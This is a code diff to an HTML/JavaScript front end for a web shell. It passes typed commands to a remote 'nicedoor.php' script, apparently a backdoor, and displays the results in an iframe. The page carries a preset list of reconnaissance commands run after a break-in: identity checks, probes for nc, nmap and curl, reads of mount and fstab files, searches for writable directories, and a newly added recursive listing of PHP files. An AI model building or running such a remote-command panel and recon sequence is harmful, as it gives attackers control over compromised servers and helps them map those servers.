@@ -74,7 +74,7 @@ function cmd_cb() {
     let rszSel = clone.getElementsByTagName('select')[0];
     ifrm.setAttribute(
         'src',
-        "http://fishstick/swancorp/nicedoor.php?cmd=" +
+        "http://fishstick/swancorp/nicedoor.php?nh&cmd=" +
             encodeURIComponent(cmdta.value)
         )
     ifrm.setAttribute('height',h);
@@ -87,7 +87,7 @@ function cmd_cb() {
 <div id=results></div>
 <div id=cmddv>
     <form id=cmmdfrm >
-        <textarea name="cmd" id="cmdta" cols="92" rows="10"></textarea>
+        <textarea name="cmd" id="cmdta" cols="72" rows="10"></textarea>
         <input type="button" value="Do It!" id=cmd-doit-btn >
         <input type="range" id="cmd-sz" list=cmd-sz-dl
         min="1" max="9" value="2" step=0.1 orient=vertical >
@@ -104,6 +104,7 @@ pwd;export -p;declare -p;type bash curl ksh lua nc netcat nmap node openssl php 
 id;whoami;groups
 df -h;findmnt;cat /etc/{fstab,mtab} /proc/self/mountinfo; ls -lF / /home/ /var/ 
 ls -FaR ..
+ls -FaR ../**/*.php
 
 find / -xdev -type d -writable -print
 find ${PATH//:/ } -executable -print
